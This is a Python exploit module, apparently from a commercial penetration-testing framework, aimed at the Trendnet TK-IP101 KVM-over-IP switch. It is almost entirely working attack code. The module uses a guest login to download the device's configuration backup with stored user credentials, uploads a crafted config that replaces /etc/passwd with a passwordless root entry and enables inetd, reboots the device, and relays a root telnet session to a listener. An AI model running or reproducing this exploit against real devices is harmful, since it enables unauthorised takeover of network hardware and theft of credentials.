#!/usr/bin/env python

import urllib2
import re
import os
import socket
import telnetlib
import tarfile
import base64
import ssl
from cStringIO import StringIO
import time
from collections import OrderedDict
from core.WebHelper import FormPoster
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_trendnet_tk_ip101_privilege_escalation"
INFO['DESCRIPTION'] = "Trendnet TK-IP101 KVM Switch Over IP Privilege Escalation"
INFO['VENDOR'] = "http://www.trendnet.com/products/KVM-over-ip-switch/TK-IP101"
INFO["CVE Name"] = ""
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG'] = "21 Feb, 2017"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Simple user can change system settings.
Tested against Firmware Kernel 2.6.21 built on 02/12/09-10:21:05, Applications Built on 04/02/09-12:46:26
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.200"
OPTIONS["PORT"] = 5908
OPTIONS["USERNAME"] = 'guest'
OPTIONS["PASSWORD"] = 'guest'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("[-] Please enable listener to recieve connect back from shell")
            self.finish(False)

    def make_url(self, path=''):
        url = 'https://{}:{}/{}'.format(self.host, self.port, path)
        return url

    def basic_auth(self):
        auth = 'Basic %s' % base64.b64encode('%s:%s' %(self.username, self.password))
        return str(auth)

    def make_request(self, path='', data=None, req=None):
        context = ssl._create_unverified_context()
        if not req:
            url = self.make_url(path)
            req = urllib2.Request(url, data=data)
        req.add_header('Authorization', self.basic_auth())
        try:
            res = urllib2.urlopen(req, context=context).read()
        except urllib2.HTTPError as e:
            if e.code == 401:
                self.log('[-] User %s:%s is not exists' % (self.username, self.password))
                self.finish(False)
            else:
                raise e
        return res

    def get_credentials(self):
        self.log('[*] Getting settings backup from device')
        url = self.make_url('goform/SetUpgradeConf')
        form = FormPoster()
        form.add_field('apply', 'Backup')
        form.add_file('UploadConf', '', '', False)
        req = form.post(url)
        res = self.make_request('', '', req)
        name = 'tk_ip101.tgz'
        self.log('[+] All settings including users credentials are downloaded')
        self.writefile(res, name)

    def upload_settings(self):
        inittabs = """inet:unknown:/bin/inetd
webs:unknown:/bin/webs
kleserver:unknown:/bin/kleserver
button:unknown:/bin/button
"""
        passwd = """root::0:0:root:/:/bin/sh"""
        filename = self.random_string() + '.tgz'
        with tarfile.open(filename, "w:gz") as tar:
            tarinfo = tarfile.TarInfo(name="etc/inittab")
            tarinfo.size = len(inittabs)
            tar.addfile(tarinfo, StringIO(inittabs))
            tarinfo = tarfile.TarInfo(name="etc/passwd")
            tarinfo.size = len(passwd)
            tar.addfile(tarinfo, StringIO(passwd))
        with open(filename, 'rb') as f:
            contents = f.read()
        self.log('[*] Uploading new config')
        form = FormPoster()
        form.add_field('apply', 'Upload')
        form.add_file('UploadConf','restore.tgz', contents, False)
        url = self.make_url('goform/SetUpgradeConf')
        req = form.post(url)
        res = self.make_request('', '', req)
        res = self.make_request('goform/SetReboot', 'apply=Reboot+Device')
        self.log('[*] Waiting for 40 secs until device will be rebooted')
        os.unlink(filename)
        time.sleep(40)

    def connect_to_telnet(self):
        self.log('[*] Trying to connect to telnet')
        tn = telnetlib.Telnet(self.host, 23, 3)
        s=socket.socket()
        s.connect(('127.0.0.1', self.listener_port))
        pattern = '/> '
        login = 'root'
        s.sendall(tn.read_until("KLE login: "))
        tn.write(login + "\n")
        data = tn.read_until(pattern)
        s.send(data)
        # wait for command from listener
        while 1:
            data = s.recv(1024)
            if data.startswith('exit'):
                break
            tn.write(data)
            data = tn.read_until(pattern)
            s.send(data)

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to {}".format(self.make_url()))
        res = self.make_request()
        self.get_credentials()
        self.upload_settings()
        self.connect_to_telnet()
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
